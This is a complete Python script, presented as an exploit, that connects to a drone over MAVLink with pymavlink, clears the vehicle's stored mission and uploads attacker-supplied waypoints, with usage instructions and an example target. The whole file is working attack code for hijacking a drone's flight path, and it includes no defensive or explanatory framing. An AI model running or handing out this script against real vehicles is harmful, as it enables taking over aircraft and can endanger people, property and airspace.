#!/usr/bin/env python3
"""
Waypoint Override Exploit Script
Injects malicious waypoints into drone mission
"""

import sys
import time
from pymavlink import mavutil

def inject_waypoints(connection_string: str, waypoints: list):
    """
    Inject waypoints into drone mission
    
    Args:
        connection_string: MAVLink connection string
        waypoints: List of (lat, lon, alt) tuples
    """
    try:
        print(f"[*] Connecting to {connection_string}...")
        master = mavutil.mavlink_connection(connection_string)
        master.wait_heartbeat()
        print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        # Clear existing mission
        print("[*] Clearing existing mission...")
        master.mav.mission_clear_all_send(target_system, target_component)
        time.sleep(1)
        
        # Send waypoint count
        print(f"[*] Uploading {len(waypoints)} waypoints...")
        master.mav.mission_count_send(target_system, target_component, len(waypoints))
        
        # Wait for request
        while True:
            msg = master.recv_match(type=['MISSION_REQUEST', 'MISSION_ACK'], blocking=True, timeout=2)
            if msg is None:
                break
            
            if msg.get_type() == 'MISSION_REQUEST':
                seq = msg.seq
                if seq < len(waypoints):
                    lat, lon, alt = waypoints[seq]
                    print(f"[*] Sending waypoint {seq}: lat={lat}, lon={lon}, alt={alt}m")
                    
                    master.mav.mission_item_send(
                        target_system,
                        target_component,
                        seq,
                        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                        0, 1 if seq == 0 else 0, 1, 0, 0, 0,
                        lat, lon, alt
                    )
                else:
                    break
            elif msg.get_type() == 'MISSION_ACK':
                if msg.type == mavutil.mavlink.MAV_MISSION_ACCEPTED:
                    print("[+] Mission uploaded successfully")
                else:
                    print(f"[-] Mission upload failed: {msg.type}")
                break
        
        return True
        
    except Exception as e:
        print(f"[-] Error injecting waypoints: {e}")
        return False

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 waypoint_override.py <connection> <lat1> <lon1> <alt1> [lat2 lon2 alt2 ...]")
        print("Example: python3 waypoint_override.py udp:127.0.0.1:14550 37.0 -122.0 50 38.0 -123.0 100")
        sys.exit(1)
    
    connection = sys.argv[1]
    waypoints = []
    
    # Parse waypoints (groups of 3: lat, lon, alt)
    for i in range(2, len(sys.argv), 3):
        if i + 2 < len(sys.argv):
            lat = float(sys.argv[i])
            lon = float(sys.argv[i + 1])
            alt = float(sys.argv[i + 2])
            waypoints.append((lat, lon, alt))
    
    if not waypoints:
        print("[-] No waypoints provided")
        sys.exit(1)
    
    success = inject_waypoints(connection, waypoints)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
